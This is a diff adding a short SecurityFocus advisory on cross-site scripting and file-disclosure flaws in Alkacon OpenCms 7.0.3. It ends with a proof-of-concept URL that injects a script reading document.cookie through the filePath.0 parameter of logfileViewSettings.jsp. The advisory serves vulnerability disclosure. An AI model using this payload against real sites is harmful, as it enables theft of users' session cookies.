@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/28152/info
+
+Alkacon OpenCms is prone to multiple input-validation vulnerabilities, including one cross-site scripting issue and a file-disclosure issue, because the application fails to properly sanitize user-supplied input.
+
+Attackers can exploit these issues to steal cookie-based authentication credentials, to control how the site is rendered to the user, or to obtain information that could aid in further attacks.
+
+OpenCms 7.0.3 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/opencms/system/workplace/admin/workplace/logfileview/logfileViewSettings.jsp?
+isLogfile.0=true&isLogfile.0.value=true&enabled.0=true&enabled.0.value=true
+&ok=Ok&action=save
+&closelink=%252Fopencms%252Fopencms%252Fsystem%252Fworkplace%252Fviews%252Fadmin%252Fadmin-main.jsp%253Fpath%253D%252Fworkplace%252Flogfileview
+&elementname=undefined&page=page1&style=new
+&path=%252Fworkplace%252Flogfileview%252FlogfileViewSettings
+&elementindex=0&framename=admin_content&windowSize.0=8000&fileEncoding.0=UTF-8
+&filePath.0=%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
